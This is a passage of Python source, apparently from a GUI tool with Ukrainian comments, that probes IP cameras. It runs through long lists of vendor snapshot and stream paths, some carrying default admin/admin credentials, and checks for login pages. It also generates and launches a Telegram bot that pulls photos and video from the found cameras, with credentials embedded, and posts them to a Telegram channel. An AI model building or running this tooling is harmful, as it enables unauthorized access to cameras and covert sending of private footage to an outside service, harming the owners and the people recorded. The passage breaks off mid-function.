                "/cgi-bin/api.cgi?cmd=Snap&channel=0", "/cgi-bin/hi3510/snap.cgi",
                "/dms?nowprofileid=1", "/img/snapshot.cgi", "/image?rand=0",
                "/cam_pic.php", "/snapshot.php", "/fetch.cgi", "/webcapture.jpg",
                "/webcam.jpg", "/video.jpg", "/image.jpg?size=3", "/cgi/jpg/image.cgi?v=1",
                "/snap.jpg?JpegCam=1", "/jpeg?id=1", "/fast/mjpeg.jpg",
                "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture&usr=admin&pwd=admin",
                "/CGIProxy.fcgi?cmd=snapPicture2", "/snap?t=1",
                "/img/video.mjpeg", "/capture/1", "/oneshotimage", "/oneshot.jpg",
                "/jpgmulreq/1/image.jpg"
            ]
        elif stream_type == "video":
            return [
                
                "/video.mjpg", "/mjpeg", "/cgi-bin/mjpg/video.cgi",
                "/videostream.asf", "/video.mp4", "/video.cgi",
                "/videostream.cgi", "/mjpg/video.mjpg", "/video/mjpg.cgi",
                "/cgi-bin/video.cgi", "/h264/media.amp", "/mpeg4/media.amp",
                "/play.cgi", "/cam/realmonitor", "/live/mpeg4",
                "/image/mpegts.cgi", "/stream.mjpg", "/ipcam.mjpg",
                "/mjpegstream.cgi", "/mjpg.cgi",
                
                
                "/mjpeg.cgi", "/live.sdp", "/livestream", "/mjpeg_stream",
                "/nphMotionJpeg", "/axis-cgi/mjpg/video.cgi", 
                "/axis-cgi/mjpg/video.cgi?resolution=640x480",
                "/axis-cgi/mjpg/video.cgi?date=1&clock=1", "/cgi-bin/CGIStream.cgi",
                "/cgi-bin/mjpeg", "/cgi-bin/video.mjpeg", "/cgi-bin/mjpegstream",
                "/cgi-bin/livemjpeg.cgi", "/cgi-bin/mjpeg_chn_main.cgi",
                "/cgi/mjpg/mjpeg.cgi", "/cgi-bin/hi3510/mjpeg.cgi",
                "/videostream", "/webcam.mjpeg", "/webcam.asf", "/live/ch00_0",
                "/live/ch01_0", "/video/mjpg.cgi", "/av/mjpeg.cgi",
                "/cgi-bin/stream.cgi", "/live/h264", "/live/mjpeg",
                "/ISAPI/Streaming/Channels/101/httpPreview", 
                "/ISAPI/Streaming/Channels/1/httpPreview",
                "/Streaming/Channels/1", "/Streaming/Channels/101",
                "/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1",
                "/videostream.cgi?rate=0", "/videostream.cgi?user=admin&pwd=admin",
                "/jpeg/video.mjpg", "/cgi-bin/faststream.cgi?stream=MxPEG",
                "/nphMotionJpeg?Resolution=640x480", "/mjpg/1/video.mjpg",
                "/mjpg/video.mjpg?timestamp=1", "/ipcam/stream.cgi",
                "/live.cgi?h264", "/rtpvideo1.sdp", "/rtpvideo2.sdp",
                "/mpeg4", "/mpeg4cif", "/h264", "/h264cif",
                "/av0_0", "/av0_1", "/av1_0", "/av1_1",
                "/live1.sdp", "/live2.sdp", "/play1.sdp", "/play2.sdp",
                "/videofeed", "/mvideo.mjpg", "/webcamXP.mjpg", "/webcam.asf",
                "/img/mjpeg.cgi", "/img/video.mjpeg", "/videostream",
                "/video.h264", "/video.mjpeg", "/video.ogg", "/video.webm",
                "/cgi-bin/cam.cgi", "/cgi-bin/livecam.cgi", 
                "/cgi-bin/CGIProxy.fcgi?cmd=GetMJStream",
                "/CGIProxy.fcgi?cmd=GetMJStream&usr=admin&pwd=admin", "/mjpegfeed.cgi",
                "/cgi-bin/fastcgi-bin/fastcgi.fcgi", 
                "/ISAPI/streaming/channels/1/httppreview",
                "/channel0_live.h264", "/channel1_live.h264", "/udpstream/1/high",
                "/stw-cgi/video.cgi?msubmenu=mjpg", "/mjpg/stream.cgi?stream=1",
                "/live/main", "/live/sub", "/live.mp4", "/live1.mp4",
                "/api/mjpeg", "/api/rtsp", "/iphone/stream.cgi", "/multipart/mjpegvideo",
                "/wvhttp/video.cgi", "/wvhttp/videostream.cgi", "/rtsp/v01", "/rtsp/v02",
                "/uapi-cgi/viewer/mjpeg.cgi", "/uapi-cgi/mjpeg"
            ]
        return []
    
    def detect_vendor(self, response):
        
        return False
    
    def find_media_urls(self, session, base_url, auth):
        photo_url = None
        video_url = None
        
        
        for path in self.get_paths("photo"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth)
                
                if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                    if len(r.content) > 2000:
                        photo_url = url
                        break
            except:
                continue
        
        
        for path in self.get_paths("video"):
            try:
                url = f"{base_url}{path}"
                r = session.get(url, timeout=1.5, verify=False, auth=auth, stream=True)
                
                if r.status_code == 200:
                    content_type = r.headers.get('Content-Type', '').lower()
                    if ('multipart' in content_type or 'stream' in content_type or 
                        'video' in content_type):
                        video_url = url
                        break
            except:
                continue
                
        return photo_url, video_url

    

    def get_rtsp_paths(self):
        """Повертає можливі RTSP шляхи"""
        
        return [
            "/", "/stream", "/live", "/media", "/video", "/h264",
            "/h265", "/mpeg4", "/1", "/ch0", "/ch1", "/ch2",
            "/stream1", "/stream2", "/profile1", "/profile2",
            "/main", "/sub", "/primary", "/secondary",
            "/av_stream", "/av0_0", "/av1_0", "/onvif",
            "/videostream", "/video.mp4", "/media/stream",
            "/channel1", "/channel2"
        ]

    def is_login_page(self, response):
        """Розширена перевірка форм логіну для загальних камер"""
        if super().is_login_page(response):
            return True
        
        if response is None or not hasattr(response, 'text'):
            return False
        
        content = response.text.lower()
        
        
        additional_indicators = [
            
            'loginform', 'loginbox', 'logindiv', 'logincontainer',
            'type="submit"', 'input type="button"', 'input type="submit"',
            'auth-form', 'authentication-form', 'login-panel', 'login_panel',
            'login-box', 'login_box', 'userlogin', 'admin_login',
            
            
            'action="login"', 'action="auth"', 'action="/login.cgi"', 
            'action="/auth.cgi"', 'action="login.php"', 'action="auth.php"',
            'name="loginform"', 'id="loginform"', 'class="loginform"',
            
            
            'введите логин', 'введіть логін', 'enter credentials',
            'login to system', 'login to camera', 'device login',
            'вхід в систему', 'авторизуйтесь', 'system login',
            'user account', 'device access', 'camera access',
            
            
            'function login()', 'function authenticate()', 'function doLogin()',
            'checklogin', 'validatelogin', 'submitlogin', 'processlogin',
            'checkpassword', 'validatecredentials',
            
            
            'www-authenticate', 'authentication required'
        ]
        
        
        for indicator in additional_indicators:
            if indicator in content:
                return True
        
        
        image_indicators = [
            'login.jpg', 'login.png', 'login.gif', 'login-bg',
            'login_bg', 'login-logo', 'login_logo', 'loginbg',
            'login-image', 'auth-image', 'login_image', 'auth_image'
        ]
        
        for img in image_indicators:
            if img in content:
                return True
        
        
        script_indicators = [
            'login.js', 'auth.js', 'authentication.js', 'user.js',
            'loginscript', 'authscript', 'loginprocess', 'authprocess'
        ]
        
        for script in script_indicators:
            if script in content:
                return True
        
        return False

def extract_dlink_model(base_url):
    """Витягує модель D-Link камери з URL або даних"""
    base_url_lower = base_url.lower()
    
    
    dlink_models = [
        "dcs-930", "dcs-932", "dcs-933", "dcs-5010", "dcs-5020", "dcs-5030",
        "dcs-2130", "dcs-2132", "dcs-2310", "dcs-2330", "dcs-4201", "dcs-4602",
        "dcs-4603", "dcs-4622", "dcs-4703", "dcs-5211", "dcs-5222", "dcs-6511",
        "dcs-7010", "dcs-7517", "dcs-8000", "dcs-8100"
    ]
    
    
    for model in dlink_models:
        if model in base_url_lower:
            return model
    
    
    import re
    match = re.search(r'dcs[-_]?(\d+)', base_url_lower)
    if match:
        model_number = match.group(1)
        return f"dcs{model_number}"
    
    return None


def load_vendor_plugins():
    """Завантажує плагіни виробників"""
    registry = VendorRegistry()
    
    
    registry.register_vendor(HikvisionPlugin())
    registry.register_vendor(DahuaPlugin())
    registry.register_vendor(DLinkPlugin())
    registry.register_vendor(AxisPlugin())
    registry.register_vendor(FoscamPlugin())
    registry.register_vendor(GenericVendorPlugin())
    
    return registry

def save_last_used_config(config_name):
    """Save the last used Telegram bot configuration name with better error handling"""
    try:
        
        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), LAST_USED_CONFIG_FILE)
        with open(file_path, 'w') as file:
            file.write(config_name)
            
            file.flush()
            os.fsync(file.fileno())
        log(f"[+] Saved last used configuration: {config_name} to {file_path}")
    except Exception as e:
        log(f"[!] Error saving last used configuration: {e}")

def get_last_used_config():
    """Get the last used Telegram bot configuration name with enhanced logging"""
    try:
        
        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), LAST_USED_CONFIG_FILE)
        if os.path.exists(file_path):
            with open(file_path, 'r') as file:
                config_name = file.read().strip()
                if config_name:
                    log(f"[*] Found last used configuration: {config_name}")
                    return config_name
                else:
                    log("[!] Last used config file exists but is empty")
        else:
            log(f"[!] Last used config file not found at: {file_path}")
    except Exception as e:
        log(f"[!] Error loading last used configuration: {e}")
    return None


TELEGRAM_BOT_TEMPLATE = '''
import aiohttp
import asyncio
import subprocess
import os
import time
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiohttp import BasicAuth

from aiogram.fsm.storage.memory import MemoryStorage
import tempfile


token = '{token}'
channel_id = '{channel_id}'

session_name = f"camera_bot_{int(time.time())}"
bot = Bot(token=token)

from aiogram.enums import ParseMode
bot.parse_mode = ParseMode.HTML

storage = MemoryStorage()
dp = Dispatcher(storage=storage)


photo_url = '{photo_url}'
video_url = '{video_url}'


temp_dir = tempfile.mkdtemp(prefix="telegram_bot_")
print(f"Using temporary directory: {temp_dir}")


try:
    if '@' in video_url and ':' in video_url.split('@')[0]:
        
        auth = None
    else:
        
        auth = BasicAuth('{auth_user}', '{auth_pass}')
except:
    auth = None


async def test_telegram_connection():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://api.telegram.org/bot{token}/getMe") as response:
                data = await response.json()
                print("Status:", response.status)
                print("Response:", data)
    except Exception as e:
        print(f"Error connecting to Telegram API: {e}")


async def download_image_from_camera():
    filename = 'captured_image.jpg'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(photo_url, auth=auth) as resp:
                if resp.status == 200:
                    with open(filename, 'wb') as f:
                        f.write(await resp.read())
                    print("Image downloaded successfully.")
                    return filename
                else:
                    print(f"Failed to download image: {resp.status}")
    except Exception as e:
        print(f"Error downloading image: {e}")
    return None


def capture_video_from_stream(duration=3):
    output_file = 'captured_video.mp4'
    cmd = [
        'ffmpeg',
        '-i', video_url,
        '-t', str(duration),
        '-c:v', 'libx264',
        '-preset', 'ultrafast',
        '-crf', '23',
        '-pix_fmt', 'yuv420p',
        '-y',
        output_file
    ]
    try:
        subprocess.run(cmd, check=True)
        print("Video capture successful.")
        return output_file
    except subprocess.CalledProcessError as e:
        print(f"Error capturing video: {e}")
        return None


async def send_image_to_telegram(image_file):
    try:
        form_data = aiohttp.FormData()
        form_data.add_field('chat_id', channel_id)
        form_data.add_field('photo', open(image_file, 'rb'), filename=image_file, content_type='image/jpeg')

        async with aiohttp.ClientSession() as session:
            async with session.post(f'https://api.telegram.org/bot{token}/sendPhoto', data=form_data) as response:
                print("Send image status:", response.status)
    except Exception as e:
        print(f"Error sending image to Telegram: {e}")


async def send_video_to_telegram(video_file):
    try:
        form_data = aiohttp.FormData()
        form_data.add_field('chat_id', channel_id)
        form_data.add_field('video', open(video_file, 'rb'), filename=video_file, content_type='video/mp4')

        async with aiohttp.ClientSession() as session:
            async with session.post(f'https://api.telegram.org/bot{token}/sendVideo', data=form_data) as response:
                print("Send video status:", response.status)
    except Exception as e:
        print(f"Error sending video to Telegram: {e}")


@dp.message(Command('photo_capture'))
async def capture_photo_command(message: types.Message):
    if os.path.exists('captured_image.jpg'):
        os.remove('captured_image.jpg')
    image_file = await download_image_from_camera()
    if image_file:
        await send_image_to_telegram(image_file)
        await message.answer("Photo captured and sent.")
        os.remove(image_file)
    else:
        await message.answer("Failed to get photo.")


@dp.message(Command('video_capture'))
async def capture_video_command(message: types.Message):
    if os.path.exists('captured_video.mp4'):
        os.remove('captured_video.mp4')
    video_file = capture_video_from_stream(duration=3)
    if video_file:
        await send_video_to_telegram(video_file)
        await message.answer("Video captured and sent.")
        os.remove(video_file)
    else:
        await message.answer("Failed to record video.")


async def main():
    await test_telegram_connection()
    await dp.start_polling(bot)


async def cleanup_resources():
    """Clean up resources before shutdown"""
    try:
        print("Cleaning up resources...")
        
        for file in os.listdir(temp_dir):
            try:
                os.remove(os.path.join(temp_dir, file))
            except:
                pass
        try:
            os.rmdir(temp_dir)
        except:
            pass
        await bot.session.close()
        print("Cleanup complete")
    except Exception as e:
        print(f"Error in cleanup: {e}")


async def main():
    await test_telegram_connection()
    try:
        
        asyncio.get_event_loop().add_signal_handler(
            signal.SIGINT, lambda: asyncio.create_task(cleanup_resources())
        )
        asyncio.get_event_loop().add_signal_handler(
            signal.SIGTERM, lambda: asyncio.create_task(cleanup_resources())
        )
        
        await dp.start_polling(bot)
    finally:
        await cleanup_resources()


import signal

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped by user")
    except Exception as e:
        print(f"Bot stopped due to error: {e}")
    finally:
        
        if not asyncio.get_event_loop().is_running():
            for file in os.listdir(temp_dir):
                try:
                    os.remove(os.path.join(temp_dir, file))
                except:
                    pass
            try:
                os.rmdir(temp_dir)
            except:
                pass
'''

os.environ["OPENCV_VIDEOIO_PRIORITY_LIST"] = "FFMPEG"



def set_opencv_backend():
    try:
        backends = []
        if hasattr(cv2, 'videoio_registry'):
            
            backends = [cv2.videoio_registry.getBackendName(b) for b in cv2.videoio_registry.getBackends()]
        
        if 'FFMPEG' in backends:
            
            print("[*] Використання FFMPEG бекенду для OpenCV")
        else:
            print("[!] FFMPEG бекенд недоступний, можливі проблеми з відтворенням відео")
            
        print(f"[*] Доступні бекенди OpenCV: {', '.join(backends) if backends else 'Неможливо визначити'}")
    except:
        print("[!] Помилка при встановленні бекенду OpenCV")


set_opencv_backend()


def load_telegram_configs():
    """Load saved Telegram bot configurations"""
    try:
        if os.path.exists(TELEGRAM_CONFIG_FILE):
            with open(TELEGRAM_CONFIG_FILE, 'r') as file:
                return json.load(file)
        return {}
    except Exception as e:
        log(f"[!] Error loading Telegram configs: {e}")
        return {}
def update_telegram_camera_urls():
    """Оновлює URL камер для Telegram конфігурації"""
    configs = load_telegram_configs()
    if not configs or not successful_streams:
        return
        
    
    camera_urls = get_camera_urls_for_telegram()
    
    
    for config_name, config in configs.items():
        if 'photo_url' not in config or 'video_url' not in config:
            
            if camera_urls.get('photo_url'):
                config['photo_url'] = camera_urls['photo_url']
            if camera_urls.get('video_url'):
                config['video_url'] = camera_urls['video_url']
                
            
            if camera_urls.get('photo_url') or camera_urls.get('video_url'):
                
                auth_user, auth_pass = extract_auth_from_url(
                    camera_urls.get('video_url', camera_urls.get('photo_url', ''))
                )
                
                if auth_user and auth_pass:
                    config['auth_user'] = auth_user
                    config['auth_pass'] = auth_pass
                    
    
    save_telegram_configs(configs)
    log("[+] Оновлено URL камер для Telegram конфігурацій")

def save_telegram_configs(configs):
    """Save Telegram bot configurations"""
    try:
        with open(TELEGRAM_CONFIG_FILE, 'w') as file:
            json.dump(configs, file, indent=4)
        log("[+] Telegram configurations saved")
    except Exception as e:
        log(f"[!] Error saving Telegram configs: {e}")

def extract_auth_from_url(url):
    """Extract username and password from URL if they exist"""
    try:
        if '@' in url:
            auth_part = url.split('://')[-1].split('@')[0]
            if ':' in auth_part:
                username, password = auth_part.split(':', 1)
                return username, password
    except:
        pass
    return None, None

def get_camera_urls_for_telegram():
    """Extract camera URLs from successful streams for Telegram configuration"""
    urls = {}
    
    for ip, data in successful_streams.items():
        
        if 'video_url' in data:
            video_url = data['video_url']
            
            if data.get('auth'):
                auth_user, auth_pass = data['auth']
                
                if '@' not in video_url:
                    protocol, rest = video_url.split('://', 1)
                    video_url = f"{protocol}://{auth_user}:{auth_pass}@{rest}"
            urls['video_url'] = video_url
        
        
        if 'photo_url' in data:
            photo_url = data['photo_url']
            
            if data.get('auth'):
                auth_user, auth_pass = data['auth']
                
                if '@' not in photo_url:
                    protocol, rest = photo_url.split('://', 1)
                    photo_url = f"{protocol}://{auth_user}:{auth_pass}@{rest}"
            urls['photo_url'] = photo_url
        
        
        if 'video_url' in urls and 'photo_url' in urls:
            break
    
    return urls

def start_telegram_bot(config_name):
    """Start the Telegram bot with the specified configuration with improved error handling"""
    global active_bot_process
    
    
    stop_telegram_bot()
    
    
    time.sleep(3)
    
    configs = load_telegram_configs()
    if config_name not in configs:
        log(f"[!] Configuration '{config_name}' not found")
        return False
    
    config = configs[config_name]
    
    
    required_fields = ['token', 'channel_id', 'photo_url', 'video_url']
    missing_fields = [field for field in required_fields if not config.get(field)]
    if missing_fields:
        log(f"[!] Configuration missing required fields: {', '.join(missing_fields)}")
        return False
    
    
    dependency_check = '''
import sys
import importlib.util


required_packages = ["aiohttp", "aiogram"]
missing_packages = []

for package in required_packages:
    if importlib.util.find_spec(package) is None:
        missing_packages.append(package)

if missing_packages:
    print(f"[ERROR] Missing required packages: {', '.join(missing_packages)}")
    print(f"[ERROR] Please install them with: pip install {' '.join(missing_packages)}")
    sys.exit(1)
'''
    
    
    bot_script = dependency_check + TELEGRAM_BOT_TEMPLATE
    
    
    replacements = {
        "{token}": config.get('token', ''),
        "{channel_id}": config.get('channel_id', ''),
        "{photo_url}": config.get('photo_url', ''),
        "{video_url}": config.get('video_url', ''),
        "{auth_user}": config.get('auth_user', ''),
        "{auth_pass}": config.get('auth_pass', '')
    }
    
    
    for placeholder, value in replacements.items():
        bot_script = bot_script.replace(placeholder, value)
    
    try:
        
        import tempfile
        temp_bot_file = tempfile.NamedTemporaryFile(suffix='.py', delete=False)
        temp_bot_path = temp_bot_file.name
        
        with open(temp_bot_path, "w") as f:
            f.write(bot_script)
        
        log("[*] Starting Telegram bot with timeout control...")
        
        
        
        active_bot_process = subprocess.Popen(
            [sys.executable, temp_bot_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,  
            universal_newlines=True,
            bufsize=1,
            start_new_session=True  
        )
        
        
        try:
            
            exit_code = active_bot_process.wait(timeout=5)
            
            stdout, stderr = active_bot_process.communicate()
            log(f"[!] Bot failed to start: {stderr or stdout}")
            return False
        except subprocess.TimeoutExpired:
            
            log(f"[+] Telegram bot started successfully with config '{config_name}'")
            return True
            
    except Exception as e:
        log(f"[!] Error starting Telegram bot: {e}")
        return False

def stop_telegram_bot():
    """Stop the running Telegram bot with enhanced termination to prevent conflicts"""
    global active_bot_process
    
    if active_bot_process:
        try:
            log("[*] Terminating Telegram bot process...")
            
            
            termination_success = False
            
            try:
                
                import os
                import signal
                import psutil
                
                
                parent = psutil.Process(active_bot_process.pid)
                children = parent.children(recursive=True)
                
                
                log("[*] Sending termination signal to bot process...")
                parent.terminate()
                
                
                gone, still_alive = psutil.wait_procs([parent], timeout=3)
                if still_alive:
                    
                    log("[!] Bot didn't terminate gracefully, forcing kill...")
                    for process in still_alive:
                        process.kill()
                
                
                for child in children:
                    try:
                        if child.is_running():
                            child.kill()
                    except:
                        pass
                
                
                time.sleep(2)
                termination_success = True
                
            except Exception as e:
                log(f"[!] Process termination method 1 failed: {e}")
                termination_success = False
                
            
            if not termination_success:
                try:
                    active_bot_process.terminate()
                    time.sleep(1)
                    if active_bot_process.poll() is None:  
                        active_bot_process.kill()
                        time.sleep(1)
                    termination_success = True
                except Exception as e:
                    log(f"[!] Process termination method 2 failed: {e}")
            
            
            try:
                
                import subprocess
                result = subprocess.run(["ps", "-ef", "|", "grep", "python.*aiogram"], 
                                      shell=True, text=True, capture_output=True)
                output = result.stdout
                
                for line in output.splitlines():
                    if "aiogram" in line and "bot" in line:
                        
                        parts = line.split()
                        if len(parts) > 1:
                            try:
                                pid = int(parts[1])
                                os.kill(pid, signal.SIGKILL)
                                log(f"[+] Killed leftover bot process with PID {pid}")
                            except:
                                pass
            except:
                pass
                
            
            active_bot_process = None
            
            
            for temp_file in glob.glob("/tmp/tmp*_bot.py*"):
                try:
                    os.remove(temp_file)
                except:
                    pass
            
            log("[+] Telegram bot stopped and resources cleaned up")
            
            
            time.sleep(1)
            
        except Exception as e:
            log(f"[!] Error stopping Telegram bot: {e}")
            active_bot_process = None

def safe_open_telegram_config():
    """Safe version of opening Telegram config window with timeouts and error handling"""
    
    stop_telegram_bot()
    
    
    def open_config_thread():
        try:
            
            dependency_result = False
            
            try:
                
                import importlib.util
                
                
                required_packages = ["aiohttp", "aiogram"]
                missing_packages = []
                
                
                for package in required_packages:
                    if importlib.util.find_spec(package) is None:
                        missing_packages.append(package)
                        
                if not missing_packages:
                    dependency_result = True
                else:
                    
                    root.after(0, lambda: messagebox.showwarning("Missing Dependencies", 
                       "Telegram bot functionality requires additional packages.\n" + 
                       "Missing: " + ", ".join(missing_packages) + "\n\n" +
                       "You can still configure settings, but the bot won't run."))
            except Exception as e:
                log(f"[!] Error checking dependencies: {e}")
                
            
            root.after(0, lambda: _create_config_window())
            
        except Exception as e:
            log(f"[!] Error in Telegram config thread: {e}")
            
            root.after(0, lambda: messagebox.showerror("Error", f"Error opening Telegram config: {e}"))
    
    def _create_config_window():
        try:
            config_window = TelegramConfigWindow(root)
            
            
            config_window.is_closing = False
            config_window.camera_urls = get_camera_urls_for_telegram()
            
            
            def check_window_health():
                try:
                    
                    if config_window and config_window.window.winfo_exists():
                        config_window.window.after(5000, check_window_health)
                except:
                    
                    try:
                        config_window.window.destroy()
                    except:
                        pass
            
            
            config_window.window.after(5000, check_window_health)
            
        except Exception as e:
            log(f"[!] Error creating config window: {e}")
            messagebox.showerror("Error", f"Error creating Telegram config window: {e}")
    
    
    threading.Thread(target=open_config_thread, daemon=True).start()

class TelegramConfigWindow:
    def __init__(self, master):
        self.master = master
        self.window = tk.Toplevel(master)
        self.window.title("Telegram Bot Configuration")
        self.window.geometry("600x500")
        self.window.transient(master)
        
        
        self.is_closing = False
        self.camera_urls = get_camera_urls_for_telegram()
        
        
        self.current_config = None
        
        
        self.configs = load_telegram_configs()
        
        
        self.create_widgets()
        
        
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)
        
        
        self.update_job = None
    
    def create_widgets(self):
        
        main_frame = ttk.Frame(self.window, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        
        config_frame = ttk.Frame(main_frame)
        config_frame.pack(fill=tk.X, padx=5, pady=10)
        
        ttk.Label(config_frame, text="Select Configuration:").pack(side=tk.LEFT, padx=5)
        
        self.config_var = tk.StringVar()
        self.config_combo = ttk.Combobox(config_frame, textvariable=self.config_var, width=30)
        self.config_combo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.update_config_list()
        
        ttk.Button(config_frame, text="Add Config", command=self.add_config).pack(side=tk.LEFT, padx=5)
        ttk.Button(config_frame, text="Apply", command=self.apply_config).pack(side=tk.LEFT, padx=5)
        ttk.Button(config_frame, text="Close and Start", command=self.close_and_start).pack(side=tk.LEFT, padx=10)
        
        
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=10)
        
        ttk.Button(control_frame, text="Start Script", command=self.start_script).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Stop Script", command=self.stop_script).pack(side=tk.LEFT, padx=5)
        
        
        log_frame = ttk.LabelFrame(main_frame, text="Bot Log", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, height=15)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        
        self.update_log()
    
    def update_config_list(self):
        """Update the configuration dropdown list"""
        config_names = list(self.configs.keys())
        self.config_combo['values'] = config_names
        if config_names:
            self.config_combo.current(0)
            self.current_config = config_names[0]
    
    def add_config(self):
        """Open improved window to add a new configuration"""
        add_window = tk.Toplevel(self.window)
        add_window.title("Add Telegram Configuration")
        add_window.geometry("700x400")  
        add_window.transient(self.window)
        add_window.resizable(True, True)  
        
        
        add_window.columnconfigure(1, weight=1)
        
        frame = ttk.Frame(add_window, padding="20")
        frame.pack(fill=tk.BOTH, expand=True)
        
        
        token_history = self.get_field_history('token')
        channel_history = self.get_field_history('channel_id')
        video_history = self.get_field_history('video_url')
        photo_history = self.get_field_history('photo_url')
        
        
        ttk.Label(frame, text="Telegram Bot API Token:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=15)
        token_var = tk.StringVar()
        token_combo = ttk.Combobox(frame, textvariable=token_var, width=60)  
        token_combo.grid(row=0, column=1, sticky=tk.W+tk.E, padx=5, pady=15)
        token_combo['values'] = token_history
        
        
        ttk.Label(frame, text="Telegram Channel ID (@channel):").grid(row=1, column=0, sticky=tk.W, padx=5, pady=15)
        channel_var = tk.StringVar()
        channel_combo = ttk.Combobox(frame, textvariable=channel_var, width=60)  
        channel_combo.grid(row=1, column=1, sticky=tk.W+tk.E, padx=5, pady=15)
        channel_combo['values'] = channel_history
        
        
        ttk.Label(frame, text="Video URL:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=15)
        video_var = tk.StringVar()
        video_combo = ttk.Combobox(frame, textvariable=video_var, width=60)  
        video_combo.grid(row=2, column=1, sticky=tk.W+tk.E, padx=5, pady=15)
        
        
        video_urls = []
        if self.camera_urls.get('video_url'):
            video_urls.append(self.camera_urls['video_url'])
        
        
        for config in self.configs.values():
            if config.get('video_url') and config['video_url'] not in video_urls:
                video_urls.append(config['video_url'])
        
        
        for url in video_history:
            if url not in video_urls:
                video_urls.append(url)
        
        video_combo['values'] = video_urls
        if video_urls:
            video_combo.current(0)
        
        
        ttk.Label(frame, text="Photo URL:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=15)
        photo_var = tk.StringVar()
        photo_combo = ttk.Combobox(frame, textvariable=photo_var, width=60)  
        photo_combo.grid(row=3, column=1, sticky=tk.W+tk.E, padx=5, pady=15)
        
        
        photo_urls = []
        if self.camera_urls.get('photo_url'):
            photo_urls.append(self.camera_urls['photo_url'])
        
        
        for config in self.configs.values():
            if config.get('photo_url') and config['photo_url'] not in photo_urls:
                photo_urls.append(config['photo_url'])
        
        
        for url in photo_history:
            if url not in photo_urls:
                photo_urls.append(url)
        
        photo_combo['values'] = photo_urls
        if photo_urls:
            photo_combo.current(0)
        
        
        def save_config():
            
            token = token_var.get().strip()
            channel_id = channel_var.get().strip()
            video_url = video_var.get().strip()
            photo_url = photo_var.get().strip()
            
            if not token or not channel_id or not video_url or not photo_url:
                messagebox.showerror("Error", "All fields are required", parent=add_window)
                return
            
            
            self.save_field_history('token', token)
            self.save_field_history('channel_id', channel_id)
            self.save_field_history('video_url', video_url)
            self.save_field_history('photo_url', photo_url)
            
            
            video_auth_user, video_auth_pass = extract_auth_from_url(video_url)
            photo_auth_user, photo_auth_pass = extract_auth_from_url(photo_url)
            
            
            auth_user = video_auth_user or photo_auth_user or ""
            auth_pass = video_auth_pass or photo_auth_pass or ""
            
            
            config_name = simpledialog.askstring("Configuration Name", 
                                              "Enter a name for this configuration:",
                                              parent=add_window)
            
            if not config_name:
                return
            
            
            self.configs[config_name] = {
                'token': token,
                'channel_id': channel_id,
                'video_url': video_url,
                'photo_url': photo_url,
                'auth_user': auth_user,
                'auth_pass': auth_pass
            }
            
            save_telegram_configs(self.configs)
            self.update_config_list()
            add_window.destroy()
        
        
        button_frame = ttk.Frame(frame)
        button_frame.grid(row=4, column=0, columnspan=2, pady=20)
        
        ttk.Button(button_frame, text="Save Configuration", command=save_config, width=20).pack()
    
    def apply_config(self):
        """Apply the selected configuration"""
        selected = self.config_var.get()
        if selected and selected in self.configs:
            self.current_config = selected
            log(f"[+] Applied Telegram configuration: {selected}")
        else:
            messagebox.showinfo("Info", "Please select a valid configuration")
    
    

    def start_script(self):
        """Start the Telegram bot script without freezing the UI"""
        if not self.current_config:
            messagebox.showinfo("Info", "Please select a configuration first")
            return
        
        
        progress_window = tk.Toplevel(self.window)
        progress_window.title("Starting Bot")
        progress_window.geometry("300x100")
        progress_window.transient(self.window)
        
        ttk.Label(progress_window, text="Starting Telegram bot...").pack(pady=10)
        progress = ttk.Progressbar(progress_window, mode="indeterminate")
        progress.pack(fill=tk.X, padx=20, pady=10)
        progress.start()
        
        def start_thread():
            try:
                
                stop_telegram_bot()
                time.sleep(0.5)
                
                
                success = start_telegram_bot(self.current_config)
                
                
                self.window.after(0, lambda: progress_window.destroy())
                
                if success:
                    
                    save_last_used_config(self.current_config)
                    
                    self.window.after(0, lambda: self.log_text.insert(tk.END, f"[+] Bot started with configuration: {self.current_config}\n"))
                    self.window.after(0, lambda: self.log_text.see(tk.END))
                else:
                    self.window.after(0, lambda: self.log_text.insert(tk.END, "[!] Failed to start bot\n"))
                    self.window.after(0, lambda: self.log_text.see(tk.END))
            
            except Exception as e:
                self.window.after(0, lambda: progress_window.destroy())
                self.window.after(0, lambda: self.log_text.insert(tk.END, f"[!] Error starting bot: {e}\n"))
                self.window.after(0, lambda: self.log_text.see(tk.END))
        
        
        threading.Thread(target=start_thread, daemon=True).start()
    
    def stop_script(self):
        """Stop the Telegram bot script"""
        stop_telegram_bot()
        self.log_text.insert(tk.END, "[+] Bot stopped\n")
        self.log_text.see(tk.END)
    
    

    def close_and_start(self):
        """Apply configuration, close window and start bot"""
        selected = self.config_var.get()
        if selected and selected in self.configs:
            self.current_config = selected
            
            
            save_last_used_config(selected)
            log(f"[+] Saving '{selected}' as last used configuration")
            
            
            self.is_closing = True
            
            
            progress_window = tk.Toplevel(self.window)
            progress_window.title("Starting Bot")
            progress_window.geometry("300x100")
            progress_window.transient(self.window)
            
            ttk.Label(progress_window, text="Starting Telegram bot...").pack(pady=10)
            progress = ttk.Progressbar(progress_window, mode="indeterminate")
            progress.pack(fill=tk.X, padx=20, pady=10)
            progress.start()
            
            
            def start_bot_thread():
                try:
                    
                    stop_telegram_bot()
                    time.sleep(0.5)  
